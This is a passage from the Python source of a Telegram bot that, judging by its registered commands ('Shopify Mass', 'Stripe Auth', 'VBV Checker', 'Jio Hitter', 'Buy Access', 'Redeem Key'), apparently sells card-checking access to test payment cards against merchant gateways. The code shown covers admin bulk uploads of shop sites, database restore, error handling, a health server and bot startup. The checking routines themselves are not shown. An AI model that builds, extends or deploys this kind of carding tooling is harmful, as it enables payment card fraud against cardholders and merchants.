    if awaiting == "site_check_input" and is_full_admin(uid):
        set_awaiting(uid, '')
        if not (msg.document.file_name or "").lower().endswith(".txt") or (msg.document.file_size or 0) > 5 * 1024 * 1024: return await msg.answer("only .txt <5MB", parse_mode="HTML")
        try: raw = (await msg.bot.download_file((await msg.bot.get_file(msg.document.file_id)).file_path)).read().decode("utf-8", errors="ignore")
        except Exception as e: return await msg.answer(f"download failed: {_sanitize_err(str(e))}", parse_mode="HTML")
        await run_site_checker_flow(msg, raw); return
    if awaiting == "site_add_bulk" and is_full_admin(uid):
        set_awaiting(uid, '')
        if not (msg.document.file_name or "").lower().endswith(".txt") or (msg.document.file_size or 0) > 5 * 1024 * 1024: return await msg.answer("only .txt <5MB", reply_markup=sites_kb(0))
        st = await msg.answer(f"{pe('loading')} <b>Downloading...</b>", parse_mode="HTML")
        try: raw = (await msg.bot.download_file((await msg.bot.get_file(msg.document.file_id)).file_path)).read().decode("utf-8", errors="ignore")
        except Exception as e: return await st.edit_text(f"{pe('cross1')} Download failed", parse_mode="HTML")
        sites = parse_site_list(raw)
        added = sum(1 for s in sites if add_site_db(s))
        await st.edit_text(f"{pe('check')} <b>Sites Added</b>: <b>{added}/{len(sites)}</b>", parse_mode="HTML", reply_markup=sites_kb(0))
        return
    if awaiting == "restore_backup" and is_full_admin(uid):
        set_awaiting(uid, '')
        if not (msg.document.file_name or "").lower().endswith((".sql", ".txt", ".gz")): return await msg.answer(f"{pe('cross1')} <b>Send .sql/.txt/.gz</b>", parse_mode="HTML")
        st = await msg.answer(f"{pe('loading')} <b>Restoring...</b>", parse_mode="HTML")
        try:
            raw_bytes = (await msg.bot.download_file((await msg.bot.get_file(msg.document.file_id)).file_path)).read()
            if await _restore_from_bytes(raw_bytes, uid, st): await st.edit_text(f"{pe('check')} <b>Database Restored</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except Exception as e: await st.edit_text(f"{pe('cross1')} Restore failed: {esc(str(e)[:200])}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

# ── Error handler / health / main ────────────────────────────────────────────
async def error_handler(event, exception=None, **kwargs):
    if exception is None: exception = kwargs.get("error", Exception("unknown"))
    if any(x in type(exception).__name__ for x in ("Disconnect", "Timeout", "ConnectionError", "ClientOSError")): return True
    err_msg = str(exception).lower()
    if any(x in err_msg for x in ("not modified", "query is too old", "query id is invalid", "message to edit not found", "message can't be edited", "no text in the message", "chat not found", "bot was blocked", "user is deactivated", "too many requests")): return True
    log.exception(f"Unhandled {type(exception).__name__}: {exception}")
    return True

async def start_health_server(port: int) -> None:
    from aiohttp import web
    app = web.Application()
    app.router.add_get("/", lambda _: web.Response(text="ok"))
    app.router.add_get("/health", lambda _: web.Response(text="ok"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    log.info(f"health server on :{port}")

async def main():
    global _bot_ref, _db_write_lock, BOT_USERNAME
    if not BOT_TOKEN: raise SystemExit("BOT_TOKEN env var missing")
    _db_write_lock = _get_write_lock(); init_db(); load_extra_admins(); load_api_state(); load_sites()

    if HAS_NODE_CLIENT:
        try:
            _node_client_module.set_load_handling_vps(get_setting("load_handling", "1") == "1")
            _node_client_module.set_load_handling_heroku(get_setting("load_handling_heroku", "1") == "1")
            asyncio.create_task(node_monitor_task())
        except Exception as e: log.warning(f"lb init failed: {e}")

    bot = Bot(token=BOT_TOKEN, session=AiohttpSession(proxy=TELEGRAM_PROXY) if TELEGRAM_PROXY else None, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot; BOT_USERNAME = (await bot.get_me()).username

    dp = Dispatcher(); dp.update.outer_middleware(EnsureUserMiddleware()); dp.include_router(router); dp.errors.register(error_handler)
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="Menu"),
            BotCommand(command="sh", description="Shopify Single"),
            BotCommand(command="msh", description="Shopify Mass"),
            BotCommand(command="auth", description="Stripe Auth Single"),
            BotCommand(command="mauth", description="Stripe Auth Mass"),
            BotCommand(command="jhit", description="Jio Hitter"),
            BotCommand(command="vbv", description="VBV Checker"),
            BotCommand(command="pay", description="Buy Access"),
            BotCommand(command="proof", description="Submit Payment Proof"),
            BotCommand(command="mdev", description="Contact Support"),
            BotCommand(command="redeem", description="Redeem Key"),
            BotCommand(command="id", description="Chat ID"),
            BotCommand(command="panel", description="Admin"),
        ])
    except: pass

    asyncio.create_task(auto_backup_task())
    if PORT:
        try: await start_health_server(int(PORT))
        except Exception as e: log.warning(f"health server failed: {e}")

    log.info(f"{BOT_BRAND} starting | apis={len(load_api_state()['endpoints'])} sites={len(get_sites())}")
    try: await dp.start_polling(bot)
    finally:
        if HAS_NODE_CLIENT:
            try: await _node_client_module.NODE_MANAGER_VPS.close()
            except: pass
            try: await _node_client_module.NODE_MANAGER_HEROKU.close()
            except: pass

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
